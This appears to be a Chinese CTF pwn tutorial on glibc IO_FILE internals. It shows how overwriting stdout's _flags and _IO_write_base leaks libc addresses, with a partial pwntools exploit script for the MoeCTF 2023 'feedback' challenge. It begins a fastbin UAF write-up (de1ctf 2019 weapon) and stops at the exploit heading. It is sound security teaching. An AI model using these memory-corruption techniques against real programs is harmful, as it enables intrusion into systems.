@@ -1,0 +1,451 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="d60e6e67d15be169e6b327c454e09c23">io file基础</h2>
+<p>（io真的是太难了！ovo！）</p>
+<p>io利用是高版本堆利用过不去的坎，在近些年里面甚至已经快要成为基础知识了，但是成体系的io利用又特别少，很多师傅的文章都是介绍某一条io链，或者某一种方法，虽然写的都很好（为什么hollk师傅不更新了），但是对于我这种基础都没搞懂的菜鸡来说，根本看不懂，这就导致我学习的时候极其痛苦，所以决心写一篇文章，记录我的学习过程，希望可以给后来的师傅们一些帮助。</p>
+<h3 data-content="1" id="2017d4afd2cd3f0cbd69628e50497b7e">学习路径</h3>
+<p>那么首先，我还是要先介绍一下我认为的学习路径，毋庸置疑，你肯定要先了解一下什么是io链，我们在pwn题中，到底应该怎么用，然后就是接下来的方向，按照我的理解，首先就要了解利用stdout泄露libc（听不懂没关系，这只是一个概述），这是第一种利用，随后在学习利用stdin去泄露libc或者任意地址写，那么在学习这些部分的时候，会对于整个io file结构有所了解。再就是学习fsop了，可以说绝大部分的io利用都可以称为fsop技术，从最开始的house of orange学起，逐渐学习各个函数的调用链，以及师傅们找到的新路径，我的文章也是这个路径，但是io的东西实在是太多太杂了，所以一篇文章很难从头说完，这会是一个相当庞大的工程。</p>
+<h3 data-content="1" id="d1d09ee52548bf5e6de6ae8c2bb4fc50">io file基础结构</h3>
+<p>言归正传，我们想学会一个东西，首先就得知道，到底什么是io file。总所周知，Linux将一切都当作文件进行操作，而io file结构体是标准C库（如glibc）中的一个数据结构，用于表示和管理文件流。也就是控制io file这个结构体，就可以达到很多我们想要达到的效果，包括但是不仅限于调用system函数，我们首先来看一下结构体长什么样子（这里以glibc-2.23为例）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727215737-2e9a0fc0-4c20-1.png"/></p>
+<p>在io file结构体外围包裹着io_file_plus结构体，而在io file plus里面还有另一个很重要的部分，vtable（虚表），而vtable就是用于实现文件流操作的虚函数表。它包含了一组函数指针，这些指针指向实现各种文件操作的函数。通过这些指针，glibc可以在运行时动态地调用适当的函数来处理不同类型的文件流操作。</p>
+<p>所以这个部分就是io利用的根本，我们的利用基本都是基于这个结构。</p>
+<p>了解这个之后，我们开始看io file结构体具体的样子</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220220-d732e936-4c20-1.png"/></p>
+<p>也许你根本看不懂，但是没关系，现在不要求你记住，你只需要记住io file是一个结构体，而这就是结构体里面的各个部分，我在下面附上各个字段的类型和作用，暂时也不要求你可以理解，有个印象即可，我会拿出题目来告诉你各个字段的作用。</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>                <span class="c1">// 文件状态标志（高位是 _IO_MAGIC，其余是标志位）</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>        <span class="c1">// 读缓冲区当前读取位置</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>        <span class="c1">// 读缓冲区结束位置</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>       <span class="c1">// 读缓冲区基地址</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>      <span class="c1">// 写缓冲区基地址</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>       <span class="c1">// 写缓冲区当前写入位置</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>       <span class="c1">// 写缓冲区结束位置</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>        <span class="c1">// 缓冲区基地址</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>         <span class="c1">// 缓冲区结束位置</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span>       <span class="c1">// 保存缓冲区基地址</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>     <span class="c1">// 备份缓冲区基地址</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span>        <span class="c1">// 保存缓冲区结束位置</span>
+    <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span> <span class="c1">// 标记指针，用于跟踪缓冲区的读写位置</span>
+    <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>   <span class="c1">// 链接到下一个文件结构，用于文件链表</span>
+    <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>               <span class="c1">// 文件描述符</span>
+    <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>               <span class="c1">// 额外的文件状态标志</span>
+    <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span>       <span class="c1">// 文件偏移（旧版，已弃用）</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span> <span class="c1">// 当前列号（用于支持列计算）</span>
+    <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span> <span class="c1">// 虚函数表偏移量</span>
+    <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>         <span class="c1">// 短缓冲区（用于小量数据的快速操作）</span>
+    <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>         <span class="c1">// 文件锁（用于多线程环境下的文件流操作保护）</span>
+<span class="p">};</span>
+</pre></div>
+<p>那么在这里就补充一个题外话，我们写pwn题的时候，大部分会在出题人给的init函数中，看到setvbuf函数，对stdin，stdout和stderr初始化，这三个部分就是io file之一，也就是这三个部分的结构就和上面的结构一模一样。我们的利用就会基于他们三个。</p>
+<p><code>stdin</code>、<code>stdout</code>和<code>stderr</code>是C语言中标准输入、标准输出和标准错误流的文件指针。它们是通过<code>_IO_FILE</code>结构体实现的，并在程序启动时由系统自动初始化，</p>
+<p>并与对应的<code>_IO_FILE</code>结构体实例相关联，提供了标准化的输入输出接口。</p>
+<p>但是实际上，这三个部分也是有对应结构的，我这里借用一下hollk师傅的图片</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727215814-449f2fd0-4c20-1.png"/></p>
+<p>他们之间的连接用的就是上面结构题中的chain字段，而链表的头部是依靠全局变量io_list_all来串起来的</p>
+<p>上面说过了，这三个部分在程序启动的时候就会自动初始化，所以我们只要运行程序，就可以找到这三个部分，要注意的是，他们位于libc，也就是泄露libc，就可以找到他们，当然，其实不泄露也可以找到，这三个部分会在bss上面有数据</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220240-e3561b2a-4c20-1.png"/></p>
+<p>这上面就存有各个部分的地址。</p>
+<p>然后我们再来看一下io_jump_t的结构</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220257-ed8a8d4c-4c20-1.png"/></p>
+<p>和上面一样，我也会给出各个部分的作用</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">_IO_jump_t</span>
+<span class="p">{</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>               <span class="c1">// 占位符，没有实际功能</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>              <span class="c1">// 占位符，没有实际功能</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>        <span class="c1">// 完成操作的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>    <span class="c1">// 写缓冲区溢出处理函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>  <span class="c1">// 读缓冲区欠载处理函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>      <span class="c1">// 读缓冲区欠载处理函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>  <span class="c1">// 处理推回字符的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>        <span class="c1">// 写入多个字符的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>        <span class="c1">// 读取多个字符的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>      <span class="c1">// 按偏移量移动文件指针的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>      <span class="c1">// 移动文件指针到指定位置的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>        <span class="c1">// 设置缓冲区的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>            <span class="c1">// 同步文件流的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span><span class="c1">// 分配缓冲区的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>            <span class="c1">// 读取数据的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>          <span class="c1">// 写入数据的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>            <span class="c1">// 移动文件指针的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>          <span class="c1">// 关闭文件流的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>            <span class="c1">// 获取文件状态的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>  <span class="c1">// 显示可用字符数的函数指针</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>          <span class="c1">// 设置区域设置信息的函数指针</span>
+<span class="p">};</span>
+</pre></div>
+<p>现在只做了解即可，这一部分涉及到了fsop，暂时不会谈及，所以你可以略过。</p>
+<h5 data-content="1" id="c3a5ef03e9d763a51427ff3b40548869">小总结</h5>
+<p>简单总结一下吧，首先最外层是我们的io_file_plus结构体，在io_file_plus结构体之内，包括两个部分，一个是io_file，另一个是io_jump_t，io_file结构体里面有我们要找的chain字段，连接着stdin,stdout和stderr三个结构体，而io_jump_t里面存放一些函数指针，指向实现各种文件操作的函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220444-2d4ffa70-4c21-1.png"/></p>
+<p>用这张不太美观的图，可以勉强看懂</p>
+<h3 data-content="1" id="e6ec3fc52c1f8f13ac9d2cfd758a63aa">利用stdout泄露libc</h3>
+<p>按照大部分的文章，这个时候是需要给大家跟一下各个函数的调用过程，但是说实话，短期内对我们并没有一点帮助，所以我们会跟，但是不会是现在。</p>
+<p>我们先来介绍一个细小的知识点</p>
+<h4 data-content="1" id="25ded0c6cfc1122f259e0b16a16d02a5">缓冲区</h4>
+<p>缓冲区是一块用于临时存储数据的内存区域，通常用于平衡数据生产者和数据消费者之间的速度差异。</p>
+<p>说人话就是，我们使用一些函数的时候，比方说scanf函数，他是先将数据写入输入缓冲区（这一部分是由stdin管理），然后在从中取出数据，放进对应的地址。比如我们在终端输入hello\n，那么这些字符会被暂存进输入缓冲区，然后在按照顺序，依次写入，那什么时候停呢，读取字符串时遇到空白字符（如空格或换行符）会停止读取，并将遇到的空白字符留在缓冲区中。这也就解释了，为什么我们输入的时候大多要在补一个\n</p>
+<p>当然，并不是这么简单的，比如%23s，那其实不管输入多少，都会写进缓冲区，只不过只取前23个字符，这个地方也有利用空间，我们暂且不表。</p>
+<p>回到我们的stdout，上面说输入缓冲区是由stdin控制的，那输出缓冲区呢，自然是stdout，</p>
+<p>那么想一想，我们在使用一些函数进行输出的时候，到底是怎么样的呢</p>
+<h6 data-content="1" id="e2072fedaadce8a14446f464d77983e1">以puts函数为例</h6>
+<p>我们想要执行puts（“hello”）的时候，puts函数接收到要输出的字符串，然后连带着字符串和\n，一起写入标准输出缓冲区，标准输出缓冲区的作用是暂时存储输出数据，以减少实际的I/O操作次数，提高效率。在默认的行缓冲模式下，<strong><code>puts</code> 函数写入的字符串在遇到换行符 <code>\n</code> 时，会触发标准输出缓冲区的刷新操作。缓冲区刷新会将缓冲区中的数据写入到实际的输出设备</strong>（如终端）。</p>
+<p>注意到重点了吗，<strong>刷新缓冲区</strong>，对的，刷新。也就是说，只要刷新了缓冲区就会输入缓冲区里面的数据。我们再来看</p>
+<p>标准输出缓冲区有三种模式：行缓冲模式、全缓冲模式和无缓冲模式。不同的缓冲模式对 <code>puts</code> 函数的行为有不同的影响。</p>
+<p>我这里并不过多讲述，一般默认的是行缓冲模式，也是我们写pwn遇到的模式，在这个模式下面，在行缓冲模式下，当遇到换行符 <code>\n</code> 时，缓冲区会自动刷新</p>
+<p>诶嘿</p>
+<p>是不是连上了，上面说到puts函数会多写入一个\n，下面就说了，这个\n会刷新缓冲区，输出数据，那么除了这种呢</p>
+<p>缓冲区的刷新（flush）可以在以下几种情况下发生：</p>
+<ol>
+<li>
+<strong>缓冲区满</strong>：当缓冲区写满时，系统会自动将缓冲区中的数据写入到实际的输出设备，并清空缓冲区。</li>
+<li>
+<strong>手动刷新</strong>：程序可以调用<code>fflush(FILE *stream)</code>函数来手动刷新缓冲区。</li>
+<li>
+<strong>正常退出</strong>：当程序正常退出时，所有打开的文件流都会自动刷新缓冲区。</li>
+<li>
+<strong>行缓冲模式</strong>：对于行缓冲模式（通常是标准输出<code>stdout</code>在交互模式下的默认模式），在输出新行字符<code>\n</code>时会自动刷新缓冲区。</li>
+</ol>
+<p>看到这里可能还是会有点懵，没关系，先记住，接下来到重点了</p>
+<p>我们再来回顾一下io的结构和作用，可以上去看看完整的，我这里放一些重要的</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span><span class="p">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>        <span class="c1">// 读缓冲区当前读取位置</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>        <span class="c1">// 读缓冲区结束位置</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>       <span class="c1">// 读缓冲区基地址</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>      <span class="c1">// 写缓冲区基地址</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>       <span class="c1">// 写缓冲区当前写入位置</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>       <span class="c1">// 写缓冲区结束位置</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>        <span class="c1">// 缓冲区基地址</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>         <span class="c1">// 缓冲区结束位置</span>
+    <span class="kt">char</span> <span class="p">*</span><span class="n">_IO_save_base</span><span class="p">;</span>       <span class="c1">// 保存缓冲区基地址</span>
+</pre></div>
+<p>了解了缓冲区，是不是一下就能看懂一点了</p>
+<p>我这里介绍stdout用的多的字段，_IO_write_base这一段记录缓冲区的起始地址，打个比方，可能就是0x1000吧，IO_write_end记录缓冲区结束的地址，就当做0x1100吧，那么在最开始，我们的IO_write_ptr和IO_write_base数值相同，也是0x1000，我们写入0x10大小的数据，每写入一个字节，ptr都会向后移动一个位置，那么最后刷新缓冲区的时候，会把base到ptr中间的所有数据都输出出来，这里就存在利用的空间了</p>
+<p>试想一下，如果我们把base改成0x500呢，那ptr还是没变，是0x1000，只要刷新缓冲区，就会把从0x500到0x1000范围内的所有数据都打印出来，这里面会不会就有我们的libc呢</p>
+<p>结果是肯定的</p>
+<p>这就是stdout利用的点，接下来我会用两个题目来详细说明利用方式，到底怎么去改这个结构体</p>
+<p>在利用之前，还需要补充一个知识点，上面结构体的第一个参数，flag标志位</p>
+<div class="highlight"><pre><span></span><span class="cp">#define _IO_MAGIC 0xFBAD0000           /* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span>
+<span class="cp">#define _OLD_STDIO_MAGIC 0xFABC0000    /* Emulate old stdio 模拟旧的标准输入输出库（stdio）行为的魔数 */</span>
+<span class="cp">#define _IO_MAGIC_MASK 0xFFFF0000      /* Magic mask 魔数掩码，用于从 _flags 变量中提取魔数部分 */</span>
+<span class="cp">#define _IO_USER_BUF 1                 /* User owns buffer; don't delete it on close. 用户拥有缓冲区，不在关闭时删除缓冲区 */</span>
+<span class="cp">#define _IO_UNBUFFERED 2               /* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span>
+<span class="cp">#define _IO_NO_READS 4                 /* Reading not allowed 不允许读取操作 */</span>
+<span class="cp">#define _IO_NO_WRITES 8                /* Writing not allowed 不允许写入操作 */</span>
+<span class="cp">#define _IO_EOF_SEEN 0x10              /* EOF seen 已经到达文件结尾（EOF） */</span>
+<span class="cp">#define _IO_ERR_SEEN 0x20              /* Error seen 已经发生错误 */</span>
+<span class="cp">#define _IO_DELETE_DONT_CLOSE 0x40     /* Don't call close(_fileno) on cleanup. 不关闭文件描述符 _fileno，在清理时不调用 close 函数 */</span>
+<span class="cp">#define _IO_LINKED 0x80                /* Set if linked (using _chain) to streambuf::_list_all. 链接到一个链表（使用 _chain 指针），用于 streambuf::_list_all */</span>
+<span class="cp">#define _IO_IN_BACKUP 0x100            /* In backup 处于备份模式 */</span>
+<span class="cp">#define _IO_LINE_BUF 0x200             /* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span>
+<span class="cp">#define _IO_TIED_PUT_GET 0x400         /* Set if put and get pointer logically tied. 在输出和输入指针逻辑上绑定时设置 */</span>
+<span class="cp">#define _IO_CURRENTLY_PUTTING 0x800    /* Currently putting 当前正在执行 put 操作 */</span>
+<span class="cp">#define _IO_IS_APPENDING 0x1000        /* Is appending 处于附加模式（在文件末尾追加内容） */</span>
+<span class="cp">#define _IO_IS_FILEBUF 0x2000          /* Is file buffer 是一个文件缓冲区 */</span>
+<span class="cp">#define _IO_BAD_SEEN 0x4000            /* Bad seen 遇到错误（bad flag set） */</span>
+<span class="cp">#define _IO_USER_LOCK 0x8000           /* User lock 用户锁定，防止其他线程访问 */</span>
+</pre></div>
+<p>这个没什么好说的，都是规定好的，你甚至可以完全不看，只需要知道把flag字段改成0xFBAD1800就行</p>
+<p>接下来开始实战</p>
+<h4 data-content="1" id="13bf71c0f8984a22fa3dfe1adfd2874b">MoeCTF_2023 feedback</h4>
+<h5 data-content="1" id="eb3bae2eb9e882f58903bafc0ad8b6e5">题目分析</h5>
+<p>先来看看ida</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220514-3ebc0d44-4c21-1.png"/></p>
+<p>首先会打开flag文件，在把flag写到puts函数地址加186972的位置，最后关闭</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220534-4ad28cb6-4c21-1.png"/></p>
+<p>再来看看漏洞点</p>
+<p>index是int型，没有检查我们的输入，输入负数就可以达到数组越界的效果了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220554-56b38328-4c21-1.png"/></p>
+<p>但是不幸的是我们没有办法对got表动手</p>
+<p>来看看其他的部分吧</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220621-66a6b796-4c21-1.png"/></p>
+<p>可以看到，就在我们的上面，有这几个部分</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220658-7caaf21e-4c21-1.png"/></p>
+<p>也就是说，这些在bss上面的数据里面存在我们的io结构体地址</p>
+<p>视角再转回我们的ida</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220719-898e4fbc-4c21-1.png"/></p>
+<p>看看这个函数，也就是我们的输入函数，如果你仔细分析就会发现，传进来的是一个指针，这意味着什么？</p>
+<p>如果我们申请到bss上面的stdout，实际情况是对位于libc中的结构体进行操作，然后呢</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220739-953daba0-4c21-1.png"/></p>
+<p>紧接着就是我们的输入函数，发现首先就调用了puts函数吗，那我们的思路就很明显了，修改stdout结构体，完成我们的泄露</p>
+<h5 data-content="1" id="f54960f9f73afd0aaa1aa177ed075cc7">思路及部分exp</h5>
+<p>我们先看看前一部分的脚本（我是本地打的，所以是2.23的版本，这道题最开始是2.31）</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'libc-2.23.so'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s1">'b read_flag'</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+<span class="c1">#dbg()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'libc_base ===&gt; '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</pre></div>
+<p>0xfbad1800是我们规定好的，前面的三个0是覆盖char<em> _IO_read_ptr，char</em> _IO_read_end; char* _IO_read_base，这三个部分是在stdin里面起作用的，用作输入缓冲区，对我们这道题没有作用，所以我们随意填充即可</p>
+<p>至于最后的这个\x00，我们先来看看结构</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220800-a211778a-4c21-1.png"/></p>
+<p>这是最开始我们还没有填充的样子，因为我本地编译的，所以有符号表，但是我们写题目的时候，patchelf换libc之后，是看不到的，所以我们还是以看不到的情况来写</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220824-b009dc06-4c21-1.png"/></p>
+<p>也就是这个样子，这个时候就需要你去对比一下各个结构的位置来找到我们的write相关的部分了</p>
+<p>可以清楚的看到，最开始的时候所有的缓冲区指向一个位置，我们覆盖flag和read相关的指针之后，把char* _IO_write_base的末尾字节改成00，这样就会伪造出一个缓冲区</p>
+<p>下次输入的时候，就会把这个缓冲区里面的数据打印出来</p>
+<p>让我们来看看</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220840-b9dfb976-4c21-1.png"/></p>
+<p>来观察对比一下，如果我们这样修改，理论上来说会泄露出stderr加208位置之后的所有数据，而实际上这个数据</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220858-c4ba3614-4c21-1.png"/></p>
+<p>就是我们虚表的地址，这个偏移是固定的（因为我的libc版本的原因，不同版本可能会有差异）</p>
+<p>但是大多情况下，我们是选择泄露出stdin的地址的，因为其实你可以发现</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220919-d0c1eaec-4c21-1.png"/></p>
+<p>我们泄露出来的部分里面是由stdin的地址的，而泄露这个之后，可以用-libc.sym['_IO_2_1<em>stdin</em>']这种来泄露出来，这样会很方便</p>
+<p>我们接着看</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220937-dbb67170-4c21-1.png"/></p>
+<p>按照我的写法，是接收第一个\x7f开头的数据，所以我接收到的是这个，减去相对于libc的偏移即可</p>
+<p>这就达到了泄露libc的效果，然后我们要做的，就是打印puts+186972和puts+186972+0x50中间的数据即可</p>
+<p>和上面一样，我们同时修改    char<em> _IO_write_base和char</em> _IO_write_ptr即可</p>
+<p>那为什么不能只修改char* _IO_write_base呢</p>
+<p>这是有原因的，你也不知道这个puts+186972和我们缓冲区地址的大小关系，如果flag的位置在我们的缓冲区之前，那会打印出大量的数据，是在是太复杂了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727220959-e91018bc-4c21-1.png"/></p>
+<p>这个样子</p>
+<p>相信我，你不会想看到这种东西的</p>
+<p>还有就是，如果puts+186972恰好在缓冲区后面呢</p>
+<p>假设 _IO_write_base被我们变成了0x1000，但是char* _IO_write_ptr这个时候是0x500，这就会有非预期的情况，我也没有找到具体的答案，但是有可能是段错误，当然也有可能打印出0x500到0x1000的数据，这就不符合我们的预期了，所以我们最好一次改两个（当然利用stdin也是可以的）</p>
+<p>具体脚本我就不给了，因为我的环境和网上都不一样，这一题只是希望大家有一个基础的了解，堆才是io大放异彩的地方</p>
+<h4 data-content="1" id="486619224c7688421c5f07c2c222aa6a">de1ctf_2019_weapon（glibc-2.23 爆破_IO_2_1_stdout)</h4>
+<h5 data-content="1" id="690b1cc34beffe822433504b24e8badb">题目分析</h5>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221018-f3f1210e-4c21-1.png"/></p>
+<p>这是我修改过的主函数部分，可以看到，我们是没有show函数的</p>
+<p>这就意味着，我们基本不可能通过show来泄露libc了，但是别急，我们来一个个函数，进行分析</p>
+<h6 data-content="1" id="a4303a27a23d122a18b68ba510640e8a">add函数</h6>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221036-febdadfa-4c21-1.png"/></p>
+<p>没有什么特别的，申请堆块，限制了大小在0x60以内，说明我们只能利用fastbin</p>
+<h6 data-content="1" id="dbcc70d99f022043d70a35fd17f4fc19">delete</h6>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221055-0a643e9e-4c22-1.png"/></p>
+<p>典型的uaf，也没什么好说的</p>
+<h6 data-content="1" id="04b86002d9bad07391b956bb86594842">edit</h6>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221112-144bbee6-4c22-1.png"/></p>
+<p>编辑部分也是，没有什么好说的</p>
+<p>那我们就可以来总结一下了，题目只有uaf，而且没有show部分，这就意味着我们正常先free再show的策略失效了，所以这个时候就需要我们进行一些特别的操作</p>
+<p>也就是利用io泄露libc（保护全开的，我这里就不放了）</p>
+<h5 data-content="1" id="5459e4e4c2b761862491d36d4a95e573">思路以及exp</h5>
